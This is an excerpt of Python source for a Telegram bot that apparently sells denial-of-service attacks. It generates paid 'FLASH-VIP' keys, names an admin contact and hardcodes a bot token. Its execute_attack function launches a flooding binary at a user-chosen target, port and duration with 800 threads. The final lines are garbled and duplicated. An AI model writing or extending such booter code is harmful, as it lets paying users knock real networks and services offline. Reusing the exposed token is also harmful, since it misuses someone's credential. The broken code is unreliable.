...
# --- Configuration ---
bot = telebot.TeleBot('7495499381:AAE5fhFl3XGK6lhHfqkFd7Phln4dnSaWicw')

# Admin user IDs
admin_id = {"7303380062"}  # Replace with actual admin ID
...
def generate_key(length=10):
    ...
    return f"FLASH-VIP-{key.upper()}"  # Ensure key is in uppercase
...
def generate_key_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻 @TG_FLASH92"
...
def execute_attack(user_id, target, port, time):
    ...
    try:
        ...
        full_command = f"./2111 {target} {port} {time} 800"  # Replace with actual attack command
...
def handle_attack(message):
    user_id = str(message.chat.id)
    cooldown_time = 10  # Cooldown in seconds (e.g., 60 seconds)
...
if __name__ == "__main__":
    ...
    time.sleep(1))mall delay to avoid rapid looping in case of persistent errors
    time.sleep(1))